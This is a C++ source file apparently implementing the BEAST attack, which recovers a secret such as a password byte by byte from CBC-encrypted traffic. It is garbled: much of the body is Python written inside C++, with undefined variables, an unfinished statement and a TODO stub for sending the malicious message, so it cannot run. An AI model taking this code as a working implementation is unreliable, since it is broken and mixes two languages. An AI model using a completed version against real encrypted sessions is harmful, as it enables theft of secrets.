#include "beast.h"

BeastDecrypter::BeastDecrypter(int max_len){
    buf = (char*)malloc(max_len);
    recv = (char*)malloc(max_len);
}

BeastDecrypter::send_malicious_message(char* buf, int len, char* ){
    //TODO: the controller forces the sender to send the message to server
    // and give the encrypted message back to controller 
}

void BeastDecrypter::run(const std::string secret, const std::string known_head) {
    std::cout << "We have now started the beast decryption" << std::endl;


    // padding is the length we need to add to i_know to create a length of 15 bytes (block size- 1)
    int padding = 16 - (strlen(known_head) - 1) % 16;
    std::string head_with_padding = known_head;
    int length_block = 16;
    int t = 0;
    for (int i=0; i<padding; i++)
    {
        known_head = "a" + 
    }

    first_r = split_len(send_malicious_message("could be any message"), 32);
    std::string lastBlockOfFirst = str(first_r[-length_block:])

    while (t < (len(find_me) - len("password: "))){
        if (padding < 0)
            s = find_me[-1 * (padding):];
        else s = find_me;

        for (int i=0; i<256; i++) {
            enc = encrypt("a" * (padding) + s, lastBlockOfFirst);

            cipherBlocks = split_len(binascii.hexlify(enc), 32);

            p_guess = i_know + chr(i);
            vector_init = str(enc[-length_block:]);
            previous_cipher = lastBlockOfFirst;

            xored = xor_block(vector_init, previous_cipher, p_guess);

            enc = encrypt(xored, vector_init);

            result = split_len(binascii.hexlify(enc), 32);

            if (chr(i) > ' ') debug =  chr(i);


            sys.stdout.write("\r%s -> %s" % (cipherBlocks[0], result[0]))
            sys.stdout.flush()  # Shows the tests

            # if the result request contains the same cipher block from the original request -> OK
            if result[0] == cipherBlocks[0]:
                print " Find char " + chr(i)
                i_know = p_guess[1:]
                padding = padding - 1
                secret.append(chr(i))
                t = t + 1
                break
            elif i == 255:
                print "Unable to find the char..."
                return secret;
        }
    }
    return secret;
   
}